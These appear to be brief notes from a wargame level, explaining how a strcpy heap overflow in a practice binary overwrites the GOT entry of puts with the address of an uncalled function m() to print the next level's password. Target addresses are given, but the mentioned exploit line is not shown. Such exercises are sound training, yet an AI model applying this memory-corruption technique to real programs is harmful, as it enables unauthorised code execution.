* in this level7 we the program expect two arguments .
* calls malloc 4 times  (each call it allocate 8 bytes)
* then the program copy argv[1] to second 8 bytes , that are pointed to by the second block of the first allocation .
* after that the program copy argv[2] to the forth 8 bytes, that are pointed to by the scond block of the third allocation.
* then the program open() "/home/user/level8/.pass" and puts its content into buffer .

* info functions on gdb shows that theres a function m() which never get called , it prints a global variable c . ( where the flag is stored)

* the program use strcpy to copy the first and second args . 
* we can use that to copy arbitrary data to memory .

* more precisly we can overwrite the GOT of puts with the address of m() ()

* running the line bellow do exactly that .

address of m (where to redirect code) : 0x080484f4
got of puts (What to write): 0x8049928
